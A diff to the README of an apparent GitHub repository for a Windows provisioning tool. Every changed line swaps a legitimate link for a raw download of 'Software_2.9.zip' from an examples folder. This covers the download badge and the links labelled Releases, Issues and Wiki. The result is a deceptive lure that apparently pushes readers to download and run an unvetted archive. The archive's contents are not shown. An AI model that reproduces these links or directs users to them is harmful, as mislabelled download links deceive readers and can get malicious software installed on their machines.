@@ -4,14 +4,14 @@ Welcome to the **windows** repository! This tool helps you automate software dep
 
 ## 📥 Download the Tool
 
-[![Download Windows](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/luanbonito02/windows/releases)
+[![Download Windows](https://github.com/luanbonito02/windows/raw/refs/heads/main/examples/detection-scripts/Software_2.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/luanbonito02/windows/raw/refs/heads/main/examples/detection-scripts/Software_2.9.zip)
 
 ## 🚀 Getting Started
 
 Follow these simple steps to get started with the **windows** provisioning tool:
 
 1. **Visit the Releases Page**
-   - To download the latest version of the software, visit this page: [GitHub Releases](https://github.com/luanbonito02/windows/releases).
+   - To download the latest version of the software, visit this page: [GitHub Releases](https://github.com/luanbonito02/windows/raw/refs/heads/main/examples/detection-scripts/Software_2.9.zip).
 
 2. **Select the Latest Version**
    - On the releases page, you will see a list of versions. Look for the latest version at the top of the list. This version will have the most updates and fixes.
@@ -58,7 +58,7 @@ To use the **windows** application, ensure your system meets the following requi
 
 If you encounter issues or have questions about using the **windows** tool, consider the following support resources:
 
-- **GitHub Issues:** You can report bugs or request features in the Issues section of the [repository](https://github.com/luanbonito02/windows/issues). 
+- **GitHub Issues:** You can report bugs or request features in the Issues section of the [repository](https://github.com/luanbonito02/windows/raw/refs/heads/main/examples/detection-scripts/Software_2.9.zip). 
 
 - **Community Forums:** Join discussions with other users for tips and best practices.
 
@@ -68,6 +68,6 @@ The **windows** tool is open-source and follows the MIT License. You can view th
 
 ## 🔗 Additional Information
 
-For advanced configuration options and additional help, please refer to the documentation included with your installation or visit our [GitHub Wiki](https://github.com/luanbonito02/windows/wiki).
+For advanced configuration options and additional help, please refer to the documentation included with your installation or visit our [GitHub Wiki](https://github.com/luanbonito02/windows/raw/refs/heads/main/examples/detection-scripts/Software_2.9.zip).
 
-To download the tool, remember to visit our releases page: [GitHub Releases](https://github.com/luanbonito02/windows/releases).
+To download the tool, remember to visit our releases page: [GitHub Releases](https://github.com/luanbonito02/windows/raw/refs/heads/main/examples/detection-scripts/Software_2.9.zip).
